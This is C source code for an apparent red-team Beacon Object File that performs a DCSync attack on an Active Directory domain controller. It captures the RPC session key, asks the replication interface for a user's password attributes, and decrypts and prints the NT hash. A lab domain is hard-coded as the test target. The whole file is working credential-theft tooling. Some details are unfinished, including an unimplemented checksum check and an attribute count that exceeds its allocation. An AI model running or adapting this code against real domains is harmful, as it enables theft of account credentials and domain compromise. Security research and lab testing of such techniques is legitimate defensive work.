
#include <windows.h>
#include <wincrypt.h>
#include <msasn1.h>
#include "base.c"

#ifdef WOW64
#include "ms-drsr_c_x86.c"
#else
#include "ms-drsr_c_x64.c"
#endif

#include "drsr_defs.h"

/*  Security context structures for session key extraction  */
typedef struct _SecHandle {
    ULONG_PTR dwLower;
    ULONG_PTR dwUpper;
} SecHandle, *PSecHandle;

typedef SecHandle CtxtHandle;
typedef PSecHandle PCtxtHandle;

typedef struct _SecPkgContext_SessionKey {
    ULONG SessionKeyLength;
    PBYTE SessionKey;
} SecPkgContext_SessionKey, *PSecPkgContext_SessionKey;

#ifndef SEC_E_OK
#define SEC_E_OK ((HRESULT)0x00000000L)
#endif
#define SECPKG_ATTR_SESSION_KEY 9
#define RPC_C_OPT_SECURITY_CALLBACK 10

#ifndef BOF
typedef LONG SECURITY_STATUS;
__declspec(dllimport) SECURITY_STATUS __stdcall QueryContextAttributesW(PCtxtHandle phContext, unsigned long ulAttribute, void *pBuffer);
__declspec(dllimport) SECURITY_STATUS __stdcall FreeContextBuffer(void *pvContextBuffer);
#else
/*  For BOF builds, we need to declare these SSPI functions  */
typedef LONG SECURITY_STATUS;
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$QueryContextAttributesW(PCtxtHandle phContext, unsigned long ulAttribute, void *pBuffer);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$FreeContextBuffer(void *pvContextBuffer);
#define QueryContextAttributesW SECUR32$QueryContextAttributesW
#define FreeContextBuffer SECUR32$FreeContextBuffer
#endif

#define BUF_SIZE 512

/*  Global session key storage  */
static BYTE* g_pSessionKey = NULL;
static DWORD g_dwSessionKeyLen = 0;

EXTERN_C void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(MSVCRT$malloc(len));
}

EXTERN_C void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	MSVCRT$free(ptr);
}

/*  RPC security callback to extract session key  */
void RPC_ENTRY RpcSecurityCallback( void* context )
{
    RPC_STATUS rpcStatus;
    SECURITY_STATUS secStatus;
    PCtxtHandle pSecurityContext = NULL;
    SecPkgContext_SessionKey sessionKeyInfo = { 0 };

    /*  Only extract once  */
    if ( g_pSessionKey != NULL )
    {
        return;
    }

    /*  Get the security context from the RPC binding  */
    rpcStatus = RPCRT4$I_RpcBindingInqSecurityContext( context, (void**)&pSecurityContext );
    if ( rpcStatus != RPC_S_OK || pSecurityContext == NULL )
    {
        internal_printf( "[!] RpcSecurityCallback: I_RpcBindingInqSecurityContext failed: 0x%x\n", rpcStatus );
        return;
    }

    /*  Query the session key from the security context  */
    secStatus = QueryContextAttributesW( pSecurityContext, SECPKG_ATTR_SESSION_KEY, &sessionKeyInfo );
    if ( secStatus != SEC_E_OK )
    {
        internal_printf( "[!] RpcSecurityCallback: QueryContextAttributesW failed: 0x%x\n", secStatus );
        return;
    }

    if ( sessionKeyInfo.SessionKeyLength == 0 || sessionKeyInfo.SessionKey == NULL )
    {
        internal_printf( "[!] RpcSecurityCallback: Session key is empty\n" );
        return;
    }

    /*  Allocate and copy the session key  */
    g_pSessionKey = (BYTE*)intAlloc( sessionKeyInfo.SessionKeyLength );
    if ( !g_pSessionKey )
    {
        FreeContextBuffer( sessionKeyInfo.SessionKey );
        return;
    }

    MSVCRT$memcpy( g_pSessionKey, sessionKeyInfo.SessionKey, sessionKeyInfo.SessionKeyLength );
    g_dwSessionKeyLen = sessionKeyInfo.SessionKeyLength;

    /*  Free the session key buffer allocated by SSPI  */
    FreeContextBuffer( sessionKeyInfo.SessionKey );

    internal_printf( "[*] RpcSecurityCallback: Session key extracted (%u bytes)\n", g_dwSessionKeyLen );
}

// modified from
// https://github.com/outflanknl/C2-Tool-Collection/blob/8b7a73b5b40bf13e905fd69eb0573a88fa81e892/BOF/PetitPotam/SOURCE/PetitPotam.c#L223
RPC_STATUS CreateBindingHandle(_In_ LPWSTR lpwTarget, _Out_ RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;

	rStatus = RPCRT4$RpcStringBindingComposeW((RPC_WSTR)L"e3514235-4b06-11d1-ab04-00c04fc2dcd2", (RPC_WSTR)L"ncacn_ip_tcp", (RPC_WSTR)lpwTarget, (RPC_WSTR)NULL, (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RPCRT4$RpcBindingFromStringBindingW(StringBinding, &Binding);
		if (!rStatus) {
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			rStatus = RPCRT4$RpcBindingSetAuthInfoExW(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (rStatus == RPC_S_OK) {
				/*  Register security callback to extract session key  */
				rStatus = RPCRT4$RpcBindingSetOption( Binding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR)RpcSecurityCallback );
				if ( rStatus != RPC_S_OK ) {
					internal_printf( "[!] RpcBindingSetOption failed: 0x%x\n", rStatus );
				}

				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				internal_printf("[>] RPC Binding successful\n");
			}
		}
	}
	if (Binding) {
		RPCRT4$RpcBindingFree(&Binding);
	}

	if (StringBinding) {
		RPCRT4$RpcStringFreeW(&StringBinding);
	}

	return rStatus;
}

/*  Helper function to create a DSNAME structure from a DN string  */
DSNAME* CreateDsName( LPWSTR dn )
{
    SIZE_T dnLen = MSVCRT$wcslen( dn );
    SIZE_T dsNameSize = sizeof( DSNAME ) + ( dnLen * sizeof( WCHAR ) );

    DSNAME* pDsName = (DSNAME*)intAlloc( dsNameSize );
    if ( pDsName == NULL )
    {
        return NULL;
    }

    pDsName->structLen = (DWORD)dsNameSize;
    pDsName->SidLen = 0;
    pDsName->NameLen = (DWORD)dnLen;
    MSVCRT$memcpy( pDsName->StringName, dn, dnLen * sizeof( WCHAR ) );

    return pDsName;
}

#ifndef BOF
/*  CRYPTO_BUFFER for non-BOF builds  */
typedef struct _CRYPTO_BUFFER
{
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} CRYPTO_BUFFER, *PCRYPTO_BUFFER;
#endif

/*  Helper function to decrypt password attributes using session key + RC4  */
BOOL DecryptAttributeWithSessionKey( BYTE* pSessionKey, DWORD dwSessionKeyLen, BYTE* pEncryptedBlob, DWORD dwBlobLen, BYTE** ppDecryptedData, DWORD* pdwDecryptedLen )
{
    if ( dwBlobLen < sizeof( ENCRYPTED_PAYLOAD ) )
    {
        return FALSE;
    }

    PENCRYPTED_PAYLOAD pPayload = (PENCRYPTED_PAYLOAD)pEncryptedBlob;

    /*  Derive MD5 hash of (SessionKey + Salt)  */
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE md5Hash[16];
    DWORD md5Len = 16;

    if ( !ADVAPI32$CryptAcquireContextW( &hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
    {
        return FALSE;
    }

    if ( !ADVAPI32$CryptCreateHash( hProv, CALG_MD5, 0, 0, &hHash ) )
    {
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    /*  Hash session key  */
    if ( !ADVAPI32$CryptHashData( hHash, pSessionKey, dwSessionKeyLen, 0 ) )
    {
        ADVAPI32$CryptDestroyHash( hHash );
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    /*  Hash salt  */
    if ( !ADVAPI32$CryptHashData( hHash, pPayload->Salt, 16, 0 ) )
    {
        ADVAPI32$CryptDestroyHash( hHash );
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    /*  Get the hash value  */
    if ( !ADVAPI32$CryptGetHashParam( hHash, HP_HASHVAL, md5Hash, &md5Len, 0 ) )
    {
        ADVAPI32$CryptDestroyHash( hHash );
        ADVAPI32$CryptReleaseContext( hProv, 0 );
        return FALSE;
    }

    ADVAPI32$CryptDestroyHash( hHash );
    ADVAPI32$CryptReleaseContext( hProv, 0 );

    /*  Calculate encrypted data length  */
    DWORD dwEncryptedDataLen = dwBlobLen - sizeof( ENCRYPTED_PAYLOAD ) + 1;

    /*  Allocate buffer for decrypted data  */
    BYTE* pDecrypted = (BYTE*)intAlloc( dwEncryptedDataLen );
    if ( !pDecrypted )
    {
        return FALSE;
    }

    /*  Copy encrypted data  */
    MSVCRT$memcpy( pDecrypted, pPayload->EncryptedData, dwEncryptedDataLen );

    /*  Decrypt using RC4 (SystemFunction032)  */
    CRYPTO_BUFFER dataBuffer;
    CRYPTO_BUFFER keyBuffer;

    dataBuffer.Length = dwEncryptedDataLen;
    dataBuffer.MaximumLength = dwEncryptedDataLen;
    dataBuffer.Buffer = pDecrypted;

    keyBuffer.Length = 16;
    keyBuffer.MaximumLength = 16;
    keyBuffer.Buffer = md5Hash;

#ifndef BOF
    typedef NTSTATUS (WINAPI *SystemFunction032_t)(PCRYPTO_BUFFER, PCRYPTO_BUFFER);
    HMODULE hAdvapi = LoadLibraryA( "advapi32.dll" );
    if ( !hAdvapi )
    {
        intFree( pDecrypted );
        return FALSE;
    }

    SystemFunction032_t pSystemFunction032 = (SystemFunction032_t)GetProcAddress( hAdvapi, "SystemFunction032" );
    if ( !pSystemFunction032 )
    {
        FreeLibrary( hAdvapi );
        intFree( pDecrypted );
        return FALSE;
    }

    NTSTATUS status = pSystemFunction032( &dataBuffer, &keyBuffer );
    FreeLibrary( hAdvapi );
#else
    NTSTATUS status = ADVAPI32$SystemFunction032( &dataBuffer, &keyBuffer );
#endif

    if ( status != 0 )
    {
        intFree( pDecrypted );
        return FALSE;
    }

    /*  TODO: Verify CRC32 checksum at pPayload->Checksum  */

    *ppDecryptedData = pDecrypted;
    *pdwDecryptedLen = dwEncryptedDataLen;

    return TRUE;
}

void execute( LPWSTR userDN, LPWSTR domainDN, LPWSTR domainController )
{
    internal_printf( "[*] Target user DN: %S\n", userDN );
    internal_printf( "[*] Domain DN     : %S\n", domainDN );
    internal_printf( "[*] Target DC     : %S\n", domainController );

    RPC_BINDING_HANDLE bHandle = NULL;
	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;

    rStatus = CreateBindingHandle( domainController, &bHandle );
	if ( rStatus != RPC_S_OK )
    {
		internal_printf( "[!] RPC Binding failed...\n" );
		goto END;
	}
    
    ULONG drsStatus;
    DRS_MSG_GETCHGREQ getChReq = { 0 };
    DRS_EXTENSIONS* pDrsExtensionsOutput = NULL;
    DRS_HANDLE drsHandle = NULL;
    DSNAME* pNamingContext = NULL;
    DSNAME* pUserDsName = NULL;
    PARTIAL_ATTR_VECTOR_V1_EXT* pPartialAttrSet = NULL;

    /*  Allocate and setup DRS extensions  */
    DRS_EXTENSIONS_INT* pDrsExtensionsInt = (DRS_EXTENSIONS_INT*)intAlloc( sizeof( DRS_EXTENSIONS_INT ) );
    if ( pDrsExtensionsInt == NULL )
    {
        internal_printf( "[!] Failed to allocate memory for DRS extensions\n" );
        goto END;
    }

    pDrsExtensionsInt->cb = sizeof( DRS_EXTENSIONS_INT ) - sizeof( DWORD );
    pDrsExtensionsInt->dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;

    internal_printf( "[*] Calling IDL_DRSBind...\n" );


    drsStatus = IDL_DRSBind( bHandle, NULL, (DRS_EXTENSIONS*)pDrsExtensionsInt, &pDrsExtensionsOutput, &drsHandle );
    if ( drsStatus == 0 )
    {
        internal_printf( "[>] IDL_DRSBind success\n" );

        /*  Check server extensions  */
        if ( pDrsExtensionsOutput != NULL && pDrsExtensionsOutput->cb >= sizeof( DWORD ) )
        {
            DRS_EXTENSIONS_INT* pServerExt = (DRS_EXTENSIONS_INT*)pDrsExtensionsOutput;
            internal_printf( "[*] Server extensions cb: %u\n", pServerExt->cb );
            internal_printf( "[*] Server flags: 0x%08x\n", pServerExt->dwFlags );

            /*  Check if server supports required capabilities  */
            if ( !( pServerExt->dwFlags & DRS_EXT_GETCHGREQ_V8 ) )
            {
                internal_printf( "[!] Server does not support GETCHGREQ_V8\n" );
                goto END;
            }
            internal_printf( "[>] Server supports GETCHGREQ_V8\n" );

            if ( pServerExt->dwFlags & DRS_EXT_STRONG_ENCRYPTION )
            {
                internal_printf( "[>] Server supports strong encryption\n" );
            }

            /*  Copy server extension info to request structure  */
            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, SiteObjGuid ) + sizeof( GUID ) )
            {
                MSVCRT$memcpy( &getChReq.V8.uuidDsaObjDest, &pServerExt->SiteObjGuid, sizeof( GUID ) );
                internal_printf( "[*] Copied SiteObjGuid to request\n" );
            }

            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, ConfigObjGUID ) + sizeof( GUID ) )
            {
                MSVCRT$memcpy( &getChReq.V8.uuidInvocIdSrc, &pServerExt->ConfigObjGUID, sizeof( GUID ) );
                internal_printf( "[*] Copied ConfigObjGUID to request\n" );
            }

            /*  Copy additional extension fields  */
            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, dwReplEpoch ) + sizeof( DWORD ) )
            {
                pDrsExtensionsInt->dwReplEpoch = pServerExt->dwReplEpoch;
                internal_printf( "[*] Copied dwReplEpoch: %u\n", pServerExt->dwReplEpoch );
            }

            if ( pServerExt->cb >= FIELD_OFFSET( DRS_EXTENSIONS_INT, dwExtCaps ) + sizeof( DWORD ) )
            {
                pDrsExtensionsInt->dwExtCaps = pServerExt->dwExtCaps;
                internal_printf( "[*] Copied dwExtCaps: 0x%08x\n", pServerExt->dwExtCaps );
            }

            /*  Create DSNAME for naming context  */
            pNamingContext = CreateDsName( domainDN );
            if ( pNamingContext == NULL )
            {
                internal_printf( "[!] Failed to create naming context DSNAME\n" );
                goto END;
            }

            /*  Create DSNAME for user  */
            pUserDsName = CreateDsName( userDN );
            if ( pUserDsName == NULL )
            {
                internal_printf( "[!] Failed to create user DSNAME\n" );
                goto END;
            }

            /*  Create partial attribute vector to request password attributes  */
            pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)intAlloc(
                sizeof( PARTIAL_ATTR_VECTOR_V1_EXT ) + ( 4 * sizeof( ATTRTYP ) )
            );
            if ( pPartialAttrSet == NULL )
            {
                internal_printf( "[!] Failed to allocate partial attribute set\n" );
                goto END;
            }

            pPartialAttrSet->dwVersion = 1;
            pPartialAttrSet->dwReserved1 = 0;
            pPartialAttrSet->cAttrs = 5;
            pPartialAttrSet->rgPartialAttr[0] = ATT_UNICODE_PWD;
            pPartialAttrSet->rgPartialAttr[1] = ATT_SUPPLEMENTAL_CREDENTIALS;
            pPartialAttrSet->rgPartialAttr[2] = ATT_NT_PWD_HISTORY;
            pPartialAttrSet->rgPartialAttr[3] = ATT_LM_PWD_HISTORY;
            pPartialAttrSet->rgPartialAttr[4] = 0x00090092;  /*  objectSid  */

            /*  Setup GetNCChanges request  */
            /*  For EXOP_REPL_OBJ: pNC = user object, use partial attr set for password attrs  */
            getChReq.V8.pNC = pUserDsName;
            getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED;
            getChReq.V8.cMaxObjects = 1000;
            getChReq.V8.cMaxBytes = 0x00a00000;
            getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
            getChReq.V8.pPartialAttrSet = pPartialAttrSet;

            /*  Verify session key was extracted by the security callback  */
            if ( g_pSessionKey == NULL || g_dwSessionKeyLen == 0 )
            {
                internal_printf( "[!] Session key was not extracted by security callback\n" );
                goto END;
            }
            internal_printf( "[*] Session key available: %u bytes\n", g_dwSessionKeyLen );

            internal_printf( "[*] Calling IDL_DRSGetNCChanges...\n" );

            DWORD dwOutVersion = 0;
            DRS_MSG_GETCHGREPLY getChReply = { 0 };

            drsStatus = IDL_DRSGetNCChanges( drsHandle, 8, &getChReq, &dwOutVersion, &getChReply );
            if ( drsStatus == 0 )
            {
                internal_printf( "[>] IDL_DRSGetNCChanges success\n" );
                internal_printf( "[*] Reply version: %u\n", dwOutVersion );

                if ( dwOutVersion == 6 || dwOutVersion == 1 )
                {
                    /*  V6 and V1 have the same pObjects structure  */
                    DRS_MSG_GETCHGREPLY_V6* pReply = &getChReply.V6;

                    internal_printf( "[*] Number of objects: %u\n", pReply->cNumObjects );
                    internal_printf( "[*] Number of bytes: %u\n", pReply->cNumBytes );
                    internal_printf( "[*] More data available: %s\n", pReply->fMoreData ? "Yes" : "No" );

                    if ( pReply->pObjects != NULL )
                    {
                        REPLENTINFLIST* pCurrent = pReply->pObjects;
                        ULONG objIndex = 0;

                        while ( pCurrent != NULL )
                        {
                            internal_printf( "\n[*] Object %u:\n", objIndex );

                            /*  Print object DN  */
                            if ( pCurrent->Entinf.pName != NULL && pCurrent->Entinf.pName->NameLen > 0 )
                            {
                                internal_printf( "    DN: %.*S\n", pCurrent->Entinf.pName->NameLen, pCurrent->Entinf.pName->StringName );
                            }

                            /*  Iterate through attributes  */
                            ATTRBLOCK* pAttrBlock = &pCurrent->Entinf.AttrBlock;
                            internal_printf( "    Attributes: %u\n", pAttrBlock->attrCount );

                            /*  Extract RID - check objectSid first, fallback to pName->Sid  */
                            DWORD dwRID = 0;

                            /*  Try objectSid attribute first  */
                            for ( ULONG ridIdx = 0; ridIdx < pAttrBlock->attrCount; ridIdx++ )
                            {
                                if ( pAttrBlock->pAttr[ridIdx].attrTyp == 0x00090092 &&
                                     pAttrBlock->pAttr[ridIdx].AttrVal.valCount > 0 )
                                {
                                    ATTRVAL* pSidVal = &pAttrBlock->pAttr[ridIdx].AttrVal.pAVal[0];
                                    if ( pSidVal->valLen >= 12 )
                                    {
                                        /*  RID is the last 4 bytes of the SID  */
                                        dwRID = *(DWORD*)( pSidVal->pVal + pSidVal->valLen - 4 );
                                        internal_printf( "    RID (from objectSid): %u (0x%x)\n", dwRID, dwRID );
                                    }
                                    break;
                                }
                            }

                            /*  Fallback: Try to get RID from DSNAME->Sid if available  */
                            if ( dwRID == 0 && pCurrent->Entinf.pName != NULL && pCurrent->Entinf.pName->SidLen > 0 )
                            {
                                BYTE* pSid = (BYTE*)&pCurrent->Entinf.pName->Sid;
                                if ( pCurrent->Entinf.pName->SidLen >= 12 )
                                {
                                    dwRID = *(DWORD*)( pSid + pCurrent->Entinf.pName->SidLen - 4 );
                                    internal_printf( "    RID (from DSNAME->Sid): %u (0x%x)\n", dwRID, dwRID );
                                }
                            }

                            if ( dwRID == 0 )
                            {
                                internal_printf( "    [!] RID not found, cannot decrypt password hashes\n" );
                            }

                            for ( ULONG i = 0; i < pAttrBlock->attrCount; i++ )
                            {
                                ATTR* pAttr = &pAttrBlock->pAttr[i];
                                internal_printf( "      [%u] attrTyp: 0x%08x, values: %u\n",
                                    i, pAttr->attrTyp, pAttr->AttrVal.valCount );

                                /*  Process attribute values  */
                                for ( ULONG j = 0; j < pAttr->AttrVal.valCount; j++ )
                                {
                                    ATTRVAL* pVal = &pAttr->AttrVal.pAVal[j];
                                    internal_printf( "          Value %u: %u bytes\n", j, pVal->valLen );

                                    /*  Decrypt password attributes  */
                                    if ( ( pAttr->attrTyp == ATT_UNICODE_PWD ||
                                           pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS ||
                                           pAttr->attrTyp == ATT_NT_PWD_HISTORY ||
                                           pAttr->attrTyp == ATT_LM_PWD_HISTORY ) &&
                                         g_pSessionKey != NULL )
                                    {
                                        BYTE* pDecrypted = NULL;
                                        DWORD dwDecryptedLen = 0;

                                        if ( DecryptAttributeWithSessionKey( g_pSessionKey, g_dwSessionKeyLen, pVal->pVal, pVal->valLen, &pDecrypted, &dwDecryptedLen ) )
                                        {
                                            if ( pAttr->attrTyp == ATT_UNICODE_PWD && dwDecryptedLen >= 16 )
                                            {
                                                internal_printf( "          [*] NT Hash: " );
                                                for ( ULONG k = 0; k < 16; k++ )
                                                {
                                                    internal_printf( "%02x", pDecrypted[k] );
                                                }
                                                internal_printf( "\n" );
                                            }
                                            else if ( pAttr->attrTyp == ATT_SUPPLEMENTAL_CREDENTIALS )
                                            {
                                                internal_printf( "          [*] Supplemental Credentials decrypted (%u bytes)\n", dwDecryptedLen );
                                            }
                                            else if ( pAttr->attrTyp == ATT_NT_PWD_HISTORY )
                                            {
                                                internal_printf( "          [*] NT Password History decrypted (%u bytes)\n", dwDecryptedLen );
                                            }
                                            else if ( pAttr->attrTyp == ATT_LM_PWD_HISTORY )
                                            {
                                                internal_printf( "          [*] LM Password History decrypted (%u bytes)\n", dwDecryptedLen );
                                            }

                                            intFree( pDecrypted );
                                        }
                                        else
                                        {
                                            internal_printf( "          [!] Decryption failed\n" );
                                        }
                                    }

                                    /*  Print hex dump of encrypted data  */
                                    if ( pVal->valLen > 0 && pVal->pVal != NULL )
                                    {
                                        ULONG dumpLen = pVal->valLen > 32 ? 32 : pVal->valLen;
                                        internal_printf( "          Encrypted: " );
                                        for ( ULONG k = 0; k < dumpLen; k++ )
                                        {
                                            internal_printf( "%02x ", pVal->pVal[k] );
                                            if ( ( k + 1 ) % 16 == 0 && k + 1 < dumpLen )
                                            {
                                                internal_printf( "\n                     " );
                                            }
                                        }
                                        if ( pVal->valLen > 32 )
                                        {
                                            internal_printf( "... (%u more bytes)", pVal->valLen - 32 );
                                        }
                                        internal_printf( "\n" );
                                    }
                                }
                            }

                            pCurrent = pCurrent->pNextEntInf;
                            objIndex++;
                        }
                    }
                    else
                    {
                        internal_printf( "[!] No objects returned\n" );
                    }
                }
                else
                {
                    internal_printf( "[!] Unsupported reply version: %u\n", dwOutVersion );
                }
            }
            else
            {
                internal_printf( "[!] IDL_DRSGetNCChanges error code: %u\n", drsStatus );
            }
        }
        else
        {
            internal_printf( "[!] No server extensions returned\n" );
            goto END;
        }
    }
    else
    {
        internal_printf( "[!] IDL_DRSBind error code: %u\n", drsStatus );
        goto END;
    }

END:
    /*  Cleanup resources  */
    if ( drsHandle )
    {
        IDL_DRSUnbind( &drsHandle );
    }

    if ( pNamingContext )
    {
        intFree( pNamingContext );
    }

    if ( pUserDsName )
    {
        intFree( pUserDsName );
    }

    if ( pDrsExtensionsInt )
    {
        intFree( pDrsExtensionsInt );
    }

    if ( pPartialAttrSet )
    {
        intFree( pPartialAttrSet );
    }

    if ( g_pSessionKey )
    {
        intFree( g_pSessionKey );
        g_pSessionKey = NULL;
        g_dwSessionKeyLen = 0;
    }

    if ( bHandle )
    {
        RPCRT4$RpcBindingFree( &bHandle );
    }

    internal_printf( "[>] Done" );
    return;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    if ( !bofstart() )
    {
        return;
    }

    LPWSTR userDN;
    LPWSTR domainDN;
    LPWSTR domainController;

    datap parser;
    BeaconDataParse( &parser, Buffer, Length );
    userDN = (WCHAR*)BeaconDataExtract( &parser, NULL );
    domainDN = (WCHAR*)BeaconDataExtract( &parser, NULL );
    domainController = (WCHAR*)BeaconDataExtract( &parser, NULL );

    if ( userDN == NULL || domainDN == NULL || domainController == NULL )
    {
        internal_printf( "[!] userDN, domainDN, and domainController must be specified" );
        return;
    }

    // call execute with args
    execute( userDN, domainDN, domainController );

    printoutput( TRUE );
};
#else
int main()
{
    execute( L"CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local", L"DC=sevenkingdoms,DC=local", L"kingslanding.sevenkingdoms.local" );
    return 0;
}
#endif
